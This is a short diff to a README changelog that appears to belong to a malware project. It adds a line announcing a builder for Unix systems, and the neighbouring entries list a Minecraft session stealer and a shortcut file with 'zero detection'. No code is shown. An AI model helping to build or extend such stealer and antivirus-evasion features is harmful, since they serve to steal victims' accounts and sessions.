@@ -102,6 +102,7 @@ Account Disabled so no more discord
 
 ## <a id="Changelog"></a>📝・Changelog
 ```
+- V4.9.4 Added Builder for unix system
 - V4.9.3 Added logs andd fixed error handler not printing out error
 - V4.9.2 Minecraft session stealer
 - V4.9.1 New LNK (Shortcut) 0 detection !
